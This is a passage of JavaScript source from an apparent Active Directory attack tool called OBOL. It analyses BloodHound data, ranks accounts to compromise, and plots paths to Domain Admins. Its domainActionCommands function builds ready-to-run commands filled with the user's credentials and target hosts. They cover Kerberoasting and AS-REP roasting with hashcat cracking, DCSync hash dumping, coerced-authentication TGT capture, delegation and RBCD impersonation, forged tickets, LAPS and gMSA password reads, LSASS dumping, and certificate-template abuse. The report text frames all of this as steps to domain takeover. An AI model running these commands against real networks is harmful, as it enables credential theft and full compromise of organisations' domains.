    var g = (summary && summary._graph) || summary || {};
    var names = g.names || {}, types = g.types || {};
    var collisions = collidingShortNames(names);
    var hopBySid = {}, hopByShort = {};
    (nearestToGoal(summary) || []).forEach(function (r) {
      if (r.sid) hopBySid[r.sid] = r.hops;
      var sh = String(r.name).split('@')[0].toUpperCase();
      if (!(sh in hopByShort) || r.hops < hopByShort[sh]) hopByShort[sh] = r.hops;
    });
    var out = [], seen = {};
    Object.keys(names).forEach(function (s) {
      var t = types[s] || '';
      if (t === 'users' && /^S-1-5-(?:18|19|20)$/i.test(canonicalWellKnownSid(s))) return;
      if (!typeMatchesFilter(t, opts.types)) return;
      var nm = names[s];
      var baseShort = String(nm).split('@')[0];
      if (!baseShort) return;
      var isColliding = !!collisions[baseShort.toUpperCase()];
      var displayShort = isColliding ? nm : baseShort;
      var dedupKey = isColliding ? nm.toUpperCase() : baseShort.toUpperCase();
      if (seen[dedupKey]) return;
      seen[dedupKey] = 1;
      var hops = (s in hopBySid) ? hopBySid[s] : ((baseShort.toUpperCase() in hopByShort) ? hopByShort[baseShort.toUpperCase()] : null);
      out.push({ name: nm, short: displayShort, type: t, hops: hops, sid: s });
    });
    out.sort(function (a, b) {
      var ah = a.hops == null ? Infinity : a.hops, bh = b.hops == null ? Infinity : b.hops;
      return ah - bh || (a.short.toLowerCase() < b.short.toLowerCase() ? -1 : 1);
    });
    return out;
  }

  function bestNextTargets(summary, ownedPrincipals, opts) {
    opts = opts || {};
    var limit = opts.limit || 8;
    summary = summary || {};
    var g = summary._graph || {};
    var ownedSids = {};
    resolveOwnedSids(g, ownedPrincipals || []).forEach(function (s) { ownedSids[s] = 1; });
    var ownedSet = {};
    (ownedPrincipals || []).forEach(function (o) { ownedSet[String(o).split('@')[0].toUpperCase()] = 1; });
    var cur = ownedPaths(summary, ownedPrincipals || []);
    var currentBest = (cur.paths && cur.paths[0]) ? cur.paths[0].length : null;
    var hopBySid = {}, hopMap = {};
    (nearestToGoal(summary) || []).forEach(function (r) {
      if (r.sid) hopBySid[r.sid] = r.hops;
      hopMap[String(r.name).split('@')[0].toUpperCase()] = r.hops;
    });
    var out = [], seen = {};
    function consider(name) {
      var prof = principalProfile(summary, name);
      var short = prof.short;
      var dedupKey = prof.sid || short;
      if (!short || seen[dedupKey] || (prof.sid && ownedSids[prof.sid]) || (!prof.sid && ownedSet[short])) return;
      seen[dedupKey] = 1;
      if (short === 'KRBTGT') return;
      var weaknesses = [];
      if (prof.asrep_roastable) weaknesses.push('asrep');
      if (prof.kerberoastable) weaknesses.push('kerberoast');
      if (prof.password_not_required) weaknesses.push('blankpw');
      if (!weaknesses.length) return;
      var hops = (prof.sid && (prof.sid in hopBySid)) ? hopBySid[prof.sid] : ((short in hopMap) ? hopMap[short] : null);
      var saves;
      if (hops == null) saves = 0;
      else if (currentBest == null) saves = hops;
      else saves = Math.max(0, currentBest - hops);
      out.push({ name: prof.name, short: prof.short, type: prof.type, hops: hops, weaknesses: weaknesses, saves: saves });
    }
    (summary.asrep_roastable || []).forEach(consider);
    (summary.kerberoastable || []).forEach(consider);
    (summary.password_not_required || []).forEach(consider);
    out.sort(function (a, b) {
      var s = b.saves - a.saves; if (s) return s;
      var ah = a.hops == null ? Infinity : a.hops, bh = b.hops == null ? Infinity : b.hops;
      return ah - bh || (a.short < b.short ? -1 : 1);
    });
    return { currentBest: currentBest, targets: out.slice(0, limit), total: out.length };
  }

  function graphFingerprint(summary) {
    var g = (summary && summary._graph) || {};
    var names = g.names || {}, types = g.types || {};
    var principals = {};
    Object.keys(names).forEach(function (s) { principals[s] = { name: String(names[s]).split('@')[0], type: types[s] || '' }; });
    return {
      domain: (summary && summary.domain) || '', at: (summary && summary.ingested_at) || 0,
      principals: principals,
      control: (g.control || []).filter(function (e) { return ABUSABLE_ACE[e[1]]; }).map(function (e) { return [e[0], e[1], e[2]]; }),
      members: (g.members || []).map(function (e) { return [e[0], e[1]]; }),
      kerberoastable: (summary.kerberoastable || []).slice(),
      asrep_roastable: (summary.asrep_roastable || []).slice(),
      password_not_required: (summary.password_not_required || []).slice(),
      dcsync_principals: (summary.dcsync_principals || []).slice(),
      unconstrained_delegation: (summary.unconstrained_delegation || []).slice()
    };
  }

  function diffCollections(prev, next) {
    if (!prev || !next) return null;
    var pn = prev.principals || {}, nn = next.principals || {};
    function nm(sid, src) { return (src[sid] && src[sid].name) ? src[sid].name : String(sid); }
    var addedP = [], removedP = [];
    Object.keys(nn).forEach(function (s) { if (!pn[s]) addedP.push(nn[s]); });
    Object.keys(pn).forEach(function (s) { if (!nn[s]) removedP.push(pn[s]); });
    function edgeIndex(fp) {
      var idx = {};
      (fp.control || []).forEach(function (e) { idx[e[0] + '|' + e[1] + '|' + e[2]] = { from: e[0], edge: e[1], to: e[2] }; });
      (fp.members || []).forEach(function (e) { idx[e[0] + '|MemberOf|' + e[1]] = { from: e[0], edge: 'MemberOf', to: e[1] }; });
      return idx;
    }
    var pe = edgeIndex(prev), ne = edgeIndex(next), addedE = [], removedE = [];
    Object.keys(ne).forEach(function (k) { if (!pe[k]) { var e = ne[k]; addedE.push({ from: nm(e.from, nn), edge: e.edge, to: nm(e.to, nn) }); } });
    Object.keys(pe).forEach(function (k) { if (!ne[k]) { var e = pe[k]; removedE.push({ from: nm(e.from, pn), edge: e.edge, to: nm(e.to, pn) }); } });
    function flagDiff(key) {
      var ps = {}, ns = {}, add = [], rem = [];
      (prev[key] || []).forEach(function (x) { ps[String(x).split('@')[0]] = 1; });
      (next[key] || []).forEach(function (x) { ns[String(x).split('@')[0]] = 1; });
      Object.keys(ns).forEach(function (x) { if (!ps[x]) add.push(x); });
      Object.keys(ps).forEach(function (x) { if (!ns[x]) rem.push(x); });
      return { added: add.sort(), removed: rem.sort() };
    }
    var flags = {
      dcsync_principals: flagDiff('dcsync_principals'),
      kerberoastable: flagDiff('kerberoastable'),
      asrep_roastable: flagDiff('asrep_roastable'),
      password_not_required: flagDiff('password_not_required'),
      unconstrained_delegation: flagDiff('unconstrained_delegation')
    };
    var changed = !!(addedP.length || removedP.length || addedE.length || removedE.length
      || Object.keys(flags).some(function (k) { return flags[k].added.length || flags[k].removed.length; }));
    return {
      changed: changed, from_at: prev.at, to_at: next.at,
      principals: { added: addedP, removed: removedP },
      edges: { added: addedE, removed: removedE },
      flags: flags
    };
  }

  // Graph projection for the tab / report
  var NODE_TYPE = {
    users: 'user', user: 'user', groups: 'group', group: 'group',
    computers: 'computer', computer: 'computer', domains: 'domain', domain: 'domain',
    gpos: 'gpo', gpo: 'gpo', ous: 'ou', ou: 'ou', containers: 'container', container: 'container',
    certtemplates: 'certtemplate', certtemplate: 'certtemplate', ca: 'ca'
  };

  function label(x) {
    var s = String(x == null ? '' : x).trim();
    return s.indexOf('@') >= 0 ? s.split('@')[0] : s;
  }

  // Merge the owned->DA path chains into a node/edge graph, right-aligning goal nodes to the
  // rightmost depth column so goals never sit in an intermediate column.
  function pathsToGraph(paths, ownedPrincipals, summary) {
    if (ownedPrincipals && !Array.isArray(ownedPrincipals) && isObj(ownedPrincipals) && !summary) {
      summary = ownedPrincipals;
      ownedPrincipals = [];
    }
    var nodes = {};
    var edges = [];
    var seen = {};
    var rawGraph = (summary && summary._graph) || summary || {};
    var rawNames = rawGraph.names || {}, rawTypes = rawGraph.types || {};
    var sidByShort = {}, typeByShort = {};
    Object.keys(rawNames).forEach(function (sid) {
      var fullUp = String(rawNames[sid]).toUpperCase();
      var sh = label(rawNames[sid]).toUpperCase();
      var nt = NODE_TYPE[String(rawTypes[sid] || 'user').toLowerCase()] || 'user';
      sidByShort[fullUp] = sid;
      typeByShort[fullUp] = nt;
      if (!sidByShort[sh]) {
        sidByShort[sh] = sid;
        typeByShort[sh] = nt;
      }
    });
    (paths || []).forEach(function (p, pi) {
      var hops = p.hops || (Array.isArray(p) ? p : []);
      if (hops.length) {
        var srcName = hops[0].from;
        var srcType = NODE_TYPE[String(hops[0].from_kind || '').toLowerCase()] || typeByShort[String(srcName).toUpperCase()] || 'user';
        if (!nodes[srcName]) nodes[srcName] = { id: srcName, label: srcName, type: srcType, role: 'owned', depth: 0, paths: [] };
        nodes[srcName].paths.push(pi);
      }
      hops.forEach(function (h, i) {
        var to = h.to;
        var kind = NODE_TYPE[String(h.to_kind || '').toLowerCase()] || typeByShort[String(to).toUpperCase()] || (i === hops.length - 1 ? 'domain' : 'group');
        var n = nodes[to] || (nodes[to] = { id: to, label: to, type: kind, depth: i + 1, paths: [] });
        n.depth = Math.max(n.depth, i + 1);
        if (kind !== 'group' || n.type === 'group') n.type = kind;
        if (i === hops.length - 1 || h.goal || h.role === 'goal') {
          n.goal = true;
          n.role = 'goal';
        } else if (!n.role) {
          n.role = 'intermediate';
        }
        n.paths.push(pi);
        var key = h.from + '\u0000' + to + '\u0000' + h.edge;
        if (!seen[key]) {
          var ed = { from: h.from, to: to, edge: h.edge, path: pi, paths: [pi] };
          if (h.alt_edges && h.alt_edges.length > 1) ed.alt_edges = h.alt_edges.slice();
          seen[key] = ed;
          edges.push(ed);
        } else if (seen[key].paths.indexOf(pi) < 0) {
          seen[key].paths.push(pi);
        }
      });
    });

    // Right-align all goal nodes to maxNonGoalDepth + 1
    var maxNonGoalDepth = 0;
    Object.keys(nodes).forEach(function (k) {
      var n = nodes[k];
      if (!n.goal && n.role !== 'goal' && n.depth > maxNonGoalDepth) maxNonGoalDepth = n.depth;
    });
    Object.keys(nodes).forEach(function (k) {
      var n = nodes[k];
      if (n.goal || n.role === 'goal') {
        n.goal = true;
        n.role = 'goal';
        n.depth = Math.max(n.depth || 0, maxNonGoalDepth + 1, edges.length ? 1 : 0);
      }
    });

    var deadEnds = [];
    var goalSidMap = {};
    if (rawGraph.da_sid) goalSidMap[rawGraph.da_sid] = 1;
    if (rawGraph.ea_sid) goalSidMap[rawGraph.ea_sid] = 1;
    if (rawGraph.domain_sid) goalSidMap[rawGraph.domain_sid] = 1;
    (rawGraph.da_sids || []).forEach(function (s) { goalSidMap[s] = 1; });
    (rawGraph.ea_sids || []).forEach(function (s) { goalSidMap[s] = 1; });
    (rawGraph.domain_sids || []).forEach(function (s) { goalSidMap[s] = 1; });

    (ownedPrincipals || []).forEach(function (u) {
      var sh = label(u).toUpperCase();
      if (!sh || !sidByShort[sh] || nodes[sh] || nodes[u]) return;
      var sid = sidByShort[String(u).toUpperCase()] || sidByShort[sh];
      if (goalSidMap[sid]) return;
      nodes[sh] = { id: sh, label: sh, type: typeByShort[sh] || 'user', role: 'owned', depth: 0, paths: [], deadEnd: true };
      if (deadEnds.indexOf(sh) < 0) deadEnds.push(sh);
    });
    var uniqSort = function (arr) { return Object.keys(arr.reduce(function (a, x) { a[x] = 1; return a; }, {})).map(Number).sort(function (a, b) { return a - b; }); };
    Object.keys(nodes).forEach(function (k) { nodes[k].paths = uniqSort(nodes[k].paths); });
    edges.forEach(function (ed) { ed.paths = uniqSort(ed.paths); });
    return {
      nodes: Object.keys(nodes).map(function (k) { return nodes[k]; }),
      edges: edges,
      count: (paths || []).length,
      paths: (paths || []).map(function (p) { return p.hops || (Array.isArray(p) ? p : []); }),
      deadEnds: deadEnds
    };
  }

  function ownedPathGraph(summary, ownedPrincipals, opts) {
    var res = ownedPaths(summary, ownedPrincipals, opts);
    return pathsToGraph(res.paths || [], ownedPrincipals, summary);
  }

  function domainActionCommands(summary, ownedPrincipals, ctx) {
    ctx = ctx || {};
    var u = (ownedPrincipals && ownedPrincipals.length) ? label(ownedPrincipals[0]) : 'USER';
    var dc = ctx.dc || 'DC';
    var domain = summary.domain || 'DOMAIN';
    var sec = ctx.secret || "-p ''";
    var pw = ctx.pw || '', nt = ctx.nt || '';
    var imp = pw ? ("'" + domain + '/' + u + ':' + String(pw).replace(/'/g, "'\\''") + "'@" + dc)
      : nt ? ("'" + domain + '/' + u + "'@" + dc + ' -hashes :' + nt)
      : ("'" + domain + '/' + u + "'@" + dc);
    var winrmAuth = pw ? ("-p '" + String(pw).replace(/'/g, "'\\''") + "'") : nt ? ('-H ' + nt) : "-p ''";
    var rdpAuth = pw ? ("/p:'" + String(pw).replace(/'/g, "'\\''") + "'") : nt ? ('/pth:' + nt) : "/p:''";
    var printerAuth = pw ? (domain + '/' + u + ":'" + String(pw).replace(/'/g, "'\\''") + "'@<HOST>") : nt ? ('-hashes :' + nt + ' ' + domain + '/' + u + '@<HOST>') : (domain + '/' + u + ":''@<HOST>");
    var certAuth = pw ? ("-p '" + String(pw).replace(/'/g, "'\\''") + "'") : nt ? ('-hashes :' + nt) : '';
    var recipes = {
      asrep: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' --asreproast asrep.hashes',
              'hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt'],
      kerberoast: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' --kerberoasting kerb.hashes',
                   'hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt'],
      dcsync: ['impacket-secretsdump ' + imp + ' -just-dc',
               'impacket-secretsdump ' + imp + ' -just-dc-user administrator'],
      unconstrained: ['python3 printerbug.py ' + printerAuth + ' <YOUR_IP>',
                      'sudo python3 krbrelayx.py --krbpass -u <HOST>\\$ # capture the coerced DC TGT'],
      constrained: ['impacket-getST -spn cifs/<HOST> -impersonate Administrator ' + imp,
                    'KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass ' + domain + '/Administrator@<HOST>'],
      rbcd: ['impacket-rbcd -delegate-from <CONTROLLED_COMP>$ -delegate-to <HOST>$ -action write ' + imp,
             'impacket-getST -spn cifs/<HOST> -impersonate Administrator ' + imp],
      gpo_abuse: ['python3 pygpoabuse.py ' + domain + '/' + u + ' -dc-ip ' + dc + ' -gpo-id <GPO_GUID> -f',
                  'sharpGPOAbuse.exe --AddLocalAdmin --UserAccount ' + u + ' --GPOName "<GPO_NAME>"'],
      trusts: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' -M enum_trusts',
               'impacket-raiseChild ' + imp],
      sid_history: ['impacket-lookupsid ' + imp,
                    'impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOM_SID> -extra-sid <EXTRA_SID> -domain ' + domain + ' Administrator'],
      gmsa: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' --gmsa',
             'bloodyAD -u ' + u + ' -d ' + domain + ' --host ' + dc + ' get object <GMSA_ACCOUNT>$ --attr msDS-ManagedPassword'],
      laps: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' -M laps',
             'bloodyAD -u ' + u + ' -d ' + domain + ' --host ' + dc + ' get object <HOST>$ --attr ms-Mcs-AdmPwd'],
      adminto: ['nxc smb <HOST> -u ' + u + ' ' + sec + ' --sam --lsa',
                'nxc smb <HOST> -u ' + u + ' ' + sec + ' -M lsassy'],
      sessions: ['nxc smb <HOST> -u ' + u + ' ' + sec + ' -M lsassy   # dump where the DA is logged in'],
      rdp: ['nxc rdp <HOST> -u ' + u + ' ' + sec, 'xfreerdp /u:' + u + ' ' + rdpAuth + ' /v:<HOST> /cert:ignore'],
      winrm: ['nxc winrm <HOST> -u ' + u + ' ' + sec, 'evil-winrm -i <HOST> -u ' + u + ' ' + winrmAuth],
      passwordnotreqd: ['nxc smb ' + dc + " -u <ACCOUNT> -p ''   # blank-password auth check"],
      rdp_reach: ['nxc rdp <HOST> -u ' + u + ' ' + sec, 'xfreerdp /u:' + u + ' ' + rdpAuth + ' /v:<HOST> /cert:ignore'],
      psremote_reach: ['nxc winrm <HOST> -u ' + u + ' ' + sec, 'evil-winrm -i <HOST> -u ' + u + ' ' + winrmAuth],
      dcom_reach: ['impacket-dcomexec ' + imp + ' -object MMC20   # DCOM execution reach',
                   'nxc smb <HOST> -u ' + u + ' ' + sec + ' -x whoami   # confirm the reach'],
      foreign: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' --query "(objectClass=foreignSecurityPrincipal)" ""'],
      esc: ['certipy find -u ' + u + '@' + domain + (certAuth ? (' ' + certAuth) : '') + ' -dc-ip ' + dc + ' -vulnerable -stdout',
            'certipy req -u ' + u + '@' + domain + (certAuth ? (' ' + certAuth) : '') + ' -dc-ip ' + dc + ' -ca <CA> -template <TEMPLATE> -upn administrator@' + domain]
    };
    var host = ctx.host, yourip = ctx.lhost;
    if (host || yourip) {
      Object.keys(recipes).forEach(function (key) {
        recipes[key] = recipes[key].map(function (c) {
          var s = c;
          if (host) s = s.split('<HOST>').join(host);
          if (yourip) s = s.split('<YOUR_IP>').join(yourip);
          return s;
        });
      });
    }
    return recipes;
  }

  function domainView(summary, ownedPrincipals, ctx) {
    summary = summary || {};
    var g = summary._graph || {};
    var collisions = collidingShortNames(g.names || {});
    function smartLabel(x) {
      var s = String(x == null ? '' : x).trim();
      var sh = label(s);
      if (collisions[sh.toUpperCase()] && s.indexOf('@') >= 0) return s;
      return sh;
    }

    var sections = [];
    var cmds = domainActionCommands(summary, ownedPrincipals, ctx);
    function sec(sid, title, hint, items, cash, keepRaw) {
      var rows = (items || []).map(keepRaw ? function (x) { return String(x); } : smartLabel);
      sections.push({
        id: sid, title: title, hint: hint, cash: cash || '',
        items: rows, count: rows.length, commands: cmds[sid] || []
      });
    }

    sec('asrep', 'AS-REP Roastable Users',
        'DONT_REQ_PREAUTH accounts, request the AS-REP and crack it offline, no credential needed.',
        summary.asrep_roastable, 'OBOL AS-REP roasts + cracks these automatically');
    sec('kerberoast', 'Kerberoastable Users',
        'Accounts with an SPN, request a TGS ticket and crack it offline.',
        summary.kerberoastable, 'OBOL Kerberoasts these');
    sec('da', 'Domain Admins', 'Full control of the domain, the usual objective.', summary.domain_admins);
    sec('ea', 'Enterprise Admins', 'Forest-wide control (all domains).', summary.enterprise_admins);
    sec('dcsync', 'Can DCSync the Domain', 'Principals holding replication rights (or the ACL to grant '
        + 'them) on the domain object, they can already pull every hash. Where you land, this is the win.',
        summary.dcsync_principals, 'OBOL secretsdumps once you become one of these');
    sec('unconstrained', 'Unconstrained Delegation', 'Computers that cache any authenticating user\'s TGT '
        + 'coerce a DC to authenticate, capture its TGT, and you own the domain.',
        summary.unconstrained_delegation, 'OBOL coerces + captures the TGT');
    sec('constrained', 'Constrained Delegation (S4U2Self/Proxy)', 'Accounts allowed to delegate to specific SPNs on target computers - impersonate Domain Admin to the target service via S4U2Self + S4U2Proxy.',
        summary.constrained_delegation, 'impacket-getST -impersonate Administrator', true);
    sec('rbcd', 'Resource-Based Constrained Delegation (RBCD)', 'Principals that can act on behalf of other identities (or write msDS-AllowedToActOnBehalfOfOtherIdentity) on a target computer.',
        summary.rbcd_targets, 'impacket-rbcd + impacket-getST', true);
    sec('gpo_abuse', 'Abusable GPO -> OU Links', 'Principals holding write/control rights over a GPO linked to an OU or domain containing users or computers.',
        summary.gpo_abuse, 'pygpoabuse / SharpGPOAbuse immediate scheduled task', true);
    var trustRows = (summary.trusts || []).map(function (t) {
      var sf = t.sid_filtering === false ? ' [SID filtering disabled]' : '';
      return t.source_domain + ' -> ' + t.target_domain + ' (' + t.direction + ', ' + t.trust_type + sf + ')';
    });
    sec('trusts', 'Domain & Forest Trusts', 'Trust relationships between domains in the forest or across external domains.',
        trustRows, 'cross-domain referral / inter-realm TGT / raiseChild', true);
    sec('sid_history', 'SID History Escalation', 'Principals carrying extra SIDs in sidHistory across or within domains.',
        summary.sid_history, 'authenticate with extra SID privilege', true);
    sec('gmsa', 'gMSA Password Readers', 'Principals that can read a Group Managed Service Account (msDS-ManagedPassword) NTLM hash.',
        summary.gmsa_accounts, 'nxc ldap --gmsa / bloodyAD get msDS-ManagedPassword', true);
    sec('laps', 'LAPS Computers & Readers', 'Computers with LAPS enabled or principals with ReadLAPSPassword rights.',
        summary.laps_computers, 'nxc ldap -M laps / bloodyAD get ms-Mcs-AdmPwd', true);
    sec('adminto', 'Domain Users -> Local Admin', 'Hosts where a broad, low-privilege group is a local '
        + 'administrator, instant lateral movement with any domain account.',
        summary.admin_to, 'log in and dump credentials', true);
    sec('sessions', 'Where a Domain Admin Is Logged In', 'Live DA sessions, land on this host and steal '
        + 'the token or credentials in memory.', summary.da_sessions, 'token-impersonate or dump LSASS', true);
    sec('rdp', 'Can RDP', 'Principals who can open an RDP session (Remote Desktop Users), a way onto '
        + 'a host with a credential you hold.', summary.can_rdp, 'xfreerdp / nxc rdp');
    sec('winrm', 'Can WinRM', 'Principals who can open a WinRM / evil-winrm shell (Remote Management Users).',
        summary.can_winrm, 'evil-winrm / nxc winrm');
    sec('rdp_reach', 'Broad RDP Reach -> Host', 'Hosts where a broad, low-privilege group can RDP in, instant lateral movement with any domain credential.', summary.rdp_reach, 'xfreerdp / nxc rdp to that host', true);
    sec('psremote_reach', 'Broad PSRemote Reach -> Host', 'Hosts where a broad group can open a WinRM / '
        + 'PSRemote shell, a shell on that host with any domain credential.', summary.psremote_reach,
        'evil-winrm / nxc winrm to that host', true);
    sec('dcom_reach', 'Broad DCOM Reach -> Host', 'Hosts where a broad group is in Distributed COM Users '
        + 'MMC20/ShellWindows DCOM code execution with any domain credential.', summary.dcom_reach,
        'impacket-dcomexec to that host', true);
    sec('foreign', 'Foreign Principals (cross-trust)', 'Group members whose SID belongs to another domain '
        + 'a foreign security principal reached over a trust; membership of a privileged group is a '
        + 'cross-domain route to control.', summary.foreign_principals, '', true);
    sec('esc', 'Vulnerable Cert Templates (AD CS)', 'ESC1-shape templates: client-auth certificates whose '
        + 'enrollee supplies the subject, request one AS a Domain Admin and authenticate as them.',
        summary.esc_templates, 'certipy req -> PKINIT / UnPAC-the-hash', true);
    sec('passwordnotreqd', 'Password Not Required', 'Accounts flagged PASSWD_NOTREQD, may authenticate '
        + 'with a BLANK password. Try it first, it costs nothing.', summary.password_not_required, "nxc with -p ''");
    sec('pwdneverexpires', 'Password Never Expires', 'Accounts whose password never expires, stale high-value crack/spray targets.', summary.pwd_never_expires);
    sec('highvalue', 'High-Value Targets', 'Objects BloodHound marks high-value.', summary.high_value);
    sec('computers', 'Computers', 'Domain-joined hosts in the collection.', summary.computers);

    var paths = [];
    var owned = ownedPaths(summary, ownedPrincipals || []);
    (owned.paths || []).forEach(function (chain) {
      var hops = (chain || []).filter(function (h) { return h.from || h.to; }).map(function (h) {
        var hopObj = {
          from: smartLabel(h.from || ''),
          edge: String(h.edge || ''),
          to: smartLabel(h.to || ''),
          to_kind: String(h.to_kind || '')
        };
        if (h.alt_edges && h.alt_edges.length > 1) hopObj.alt_edges = h.alt_edges.slice();
        return hopObj;
      });
      if (hops.length) {
        var keyStr = hops.map(function (h) { return h.from + '>' + h.edge + '>' + h.to; }).join('|');
        var dup = paths.some(function (q) {
          return q.hops.map(function (h) { return h.from + '>' + h.edge + '>' + h.to; }).join('|') === keyStr;
        });
        if (!dup) paths.push({ hops: hops, length: hops.length });
      }
    });
    paths.sort(function (a, b) { return a.length - b.length; });

    var headline;
    if (paths.length) {
      var daSet = {};
      (summary.domain_admins || []).forEach(function (d) { daSet[label(d).toUpperCase()] = 1; });
      var primary = paths.filter(function (p) {
        var s = p.hops[0] ? label(p.hops[0].from).toUpperCase() : '';
        return !daSet[s] && p.hops.some(function (h) { return !/^memberof$/i.test(h.edge); });
      })[0] || paths[0];
      var goal = primary.hops[primary.hops.length - 1].to;
      headline = paths.length + ' path(s) from a principal you own to ' + goal + '. The shortest is '
        + primary.length + ' hop(s) from ' + primary.hops[0].from + '. OBOL\'s ACL-abuse move walks it automatically.';
    } else if (summary.domain || (summary.files && summary.files.length) || summary.users) {
      headline = 'No owned->Domain-Admins path derived from this collection, start from the high-value '
        + 'queries below (a DCSync principal, an unconstrained-delegation host, or a broad local-admin edge is '
        + 'usually the way in). Enter a principal you own to derive the route.';
    } else {
      headline = '';
    }
    var analysis = { headline: headline, paths: paths, graph: pathsToGraph(paths, ownedPrincipals, summary) };

    var collected = !!(summary.domain || summary.users || (summary.files && summary.files.length)
      || (summary.computers && summary.computers.length));
    return {
      domain: summary.domain || '',
      domains: summary.domains || (summary.domain ? [summary.domain] : []),
      collected: collected,
      users: summary.users || 0,
      ingested_at: summary.ingested_at,
      files: summary.files || [],
      analysis: analysis,
      sections: sections
    };
  }

  // Self-contained printable report
  var REPORT_CSS = '\n'
    + ':root{--ink:#1a1f2b;--muted:#5b6472;--line:#e3e7ee;--accent:#2f5bea;--goal:#c0392b;--edge:#b7791f;--bg:#f6f8fb}\n'
    + '*{box-sizing:border-box}body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:var(--ink);background:var(--bg);margin:0;padding:0}\n'
    + '.wrap{max-width:900px;margin:0 auto;padding:28px 22px 60px}\n'
    + 'header{background:#12182a;color:#fff;border-radius:12px;padding:20px 24px;margin-bottom:22px}\n'
    + 'header h1{margin:0 0 4px;font-size:20px}header .sub{color:#aab4c8;font-size:12px}\n'
    + '.kpis{display:flex;flex-wrap:wrap;gap:10px;margin:14px 0 4px}\n'
    + '.kpi{background:#1c2542;border:1px solid #2b3557;border-radius:9px;padding:8px 12px;min-width:90px}\n'
    + '.kpi .n{font-size:18px;font-weight:700}.kpi .l{color:#9fb0d0;font-size:11px;text-transform:uppercase;letter-spacing:.06em}\n'
    + 'h2{font-size:15px;margin:26px 0 8px;padding-bottom:6px;border-bottom:2px solid var(--line)}\n'
    + '.hint{color:var(--muted);font-size:12.5px;margin:-2px 0 10px}\n'
    + '.analysis{background:#fff;border:1px solid var(--line);border-left:4px solid var(--accent);border-radius:10px;padding:14px 16px;margin:8px 0}\n'
    + '.chain{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12.5px;margin:6px 0;display:flex;flex-wrap:wrap;gap:5px;align-items:center}\n'
    + '.node{background:#eef2ff;border:1px solid #cdd8ff;border-radius:6px;padding:2px 7px;white-space:nowrap}\n'
    + '.node.goal{background:#fdecea;border-color:#f1b0a8;color:var(--goal);font-weight:700}\n'
    + '.edge{color:var(--edge);font-size:11px}\n'
    + 'table{width:100%;border-collapse:collapse;background:#fff;border:1px solid var(--line);border-radius:10px;overflow:hidden;margin:6px 0 4px}\n'
    + 'th{background:#eef1f6;text-align:left;font-size:11px;letter-spacing:.05em;text-transform:uppercase;color:var(--muted);padding:8px 12px}\n'
    + 'td{padding:7px 12px;border-top:1px solid var(--line);font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12.5px}\n'
    + '.cash{color:#1a7f52;font-size:11.5px;margin:2px 0 0}\n'
    + '.empty{color:var(--muted);font-style:italic;font-size:12.5px;padding:4px 0}\n'
    + 'footer{color:var(--muted);font-size:11px;margin-top:30px;text-align:center}\n'
    + '@media print{body{background:#fff}header{background:#12182a!important;-webkit-print-color-adjust:exact;print-color-adjust:exact}.wrap{max-width:none}}\n';

  function esc(s) {
    return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;')
      .replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
  }

  function fmtWhen(ts) {
    var d = new Date((ts || (Date.now() / 1000)) * 1000);
    function p(n) { return (n < 10 ? '0' : '') + n; }
    return d.getUTCFullYear() + '-' + p(d.getUTCMonth() + 1) + '-' + p(d.getUTCDate())
      + ' ' + p(d.getUTCHours()) + ':' + p(d.getUTCMinutes()) + ' UTC';
  }

  function domainReportHtml(summary, view) {
    summary = summary || {};
    var v = view || domainView(summary, summary.collected_owned || []);
    var dom = esc((v.domains && v.domains.length > 1) ? v.domains.join(', ') : (v.domain || 'unknown'));
    var when = fmtWhen(v.ingested_at);
    var an = v.analysis || {};
    var parts = [];
    if (!v.collected) parts.push('<div class="empty">No BloodHound collection ingested yet.</div>');
    if (an.headline) {
      parts.push('<h2>Attack analysis, route to Domain Admins</h2>');
      parts.push('<div class="analysis"><div>' + esc(an.headline) + '</div>');
      (an.paths || []).forEach(function (p, i) {
        var hops = p.hops || [];
        var chain = hops.length ? ('<span class="node">' + esc(hops[0].from) + '</span>') : '';
        hops.forEach(function (hop, idx) {
          var goal = idx === hops.length - 1 ? ' goal' : '';
          chain += '<span class="edge">\u2500' + esc(hop.edge) + '\u25b8</span>'
            + '<span class="node' + goal + '">' + esc(hop.to) + '</span>';
        });
        parts.push('<div class="chain"><b style="color:#5b6472">#' + (i + 1) + '</b> ' + chain + '</div>');
      });
      parts.push('</div>');
    }
    (v.sections || []).forEach(function (s) {
      parts.push('<h2>' + esc(s.title) + ' <span style="color:#9aa4b2;font-weight:400">\u00b7 ' + s.count + '</span></h2>');
      parts.push('<div class="hint">' + esc(s.hint || '') + '</div>');
      if (s.count) {
        var rows = s.items.map(function (it) { return '<tr><td>' + esc(it) + '</td></tr>'; }).join('');
        parts.push('<table><tr><th>' + esc(s.title) + '</th></tr>' + rows + '</table>');
        if (s.cash) parts.push('<div class="cash">' + (OBOL.ic ? OBOL.ic('bolt') : '') + ' ' + esc(s.cash) + '</div>');
      } else {
        parts.push('<div class="empty">None in this collection.</div>');
      }
    });
    var kpis = '<div class="kpi"><div class="n">' + (v.users || 0) + '</div><div class="l">Users</div></div>';
    (v.sections || []).forEach(function (s) {
      if (['dcsync', 'unconstrained', 'constrained', 'rbcd', 'adminto', 'asrep', 'kerberoast'].indexOf(s.id) >= 0 && s.count) {
        kpis += '<div class="kpi"><div class="n">' + s.count + '</div><div class="l">' + esc(s.title) + '</div></div>';
      }
    });
    return '<!doctype html><html><head><meta charset="utf-8">'
      + '<title>Domain analysis: ' + dom + '</title><style>' + REPORT_CSS + '</style></head><body><div class="wrap">'
      + '<header><h1>Domain analysis \u00b7 ' + dom + '</h1>'
      + '<div class="sub">OBOL, BloodHound analysis &amp; escalation report \u00b7 ingested ' + when + '</div>'
      + '<div class="kpis">' + kpis + '</div></header>'
      + parts.join('')
